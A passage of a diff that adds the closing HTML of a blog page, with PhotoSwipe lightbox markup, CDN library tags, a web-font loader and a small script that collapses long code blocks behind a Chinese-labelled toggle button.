+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+  <script>
+    (function () {
+      const maxHeight = 420;
+
+      function initCodeFold() {
+        document
+          .querySelectorAll(".article-content .highlight")
+          .forEach(function (block) {
+            if (block.dataset.codeFoldInit === "true") return;
+
+            block.dataset.codeFoldInit = "true";
+
+            if (block.scrollHeight <= maxHeight + 40) return;
+
+            const wrapper = document.createElement("div");
+            wrapper.className = "code-fold-wrapper";
+
+            block.parentNode.insertBefore(wrapper, block);
+            wrapper.appendChild(block);
+
+            block.classList.add("code-collapsible", "code-collapsed");
+
+            const button = document.createElement("button");
+            button.type = "button";
+            button.className = "code-toggle-button";
+            button.textContent = "展开代码";
+            button.setAttribute("aria-expanded", "false");
+
+            button.addEventListener("click", function () {
+              const collapsed = block.classList.toggle("code-collapsed");
+
+              button.textContent = collapsed ? "展开代码" : "收起代码";
+              button.setAttribute("aria-expanded", String(!collapsed));
+            });
+
+            wrapper.appendChild(button);
+          });
+      }
+
+      if (document.readyState === "loading") {
+        document.addEventListener("DOMContentLoaded", initCodeFold);
+      } else {
+        initCodeFold();
+      }
+    })();
+  </script>
+    </body>
+</html>
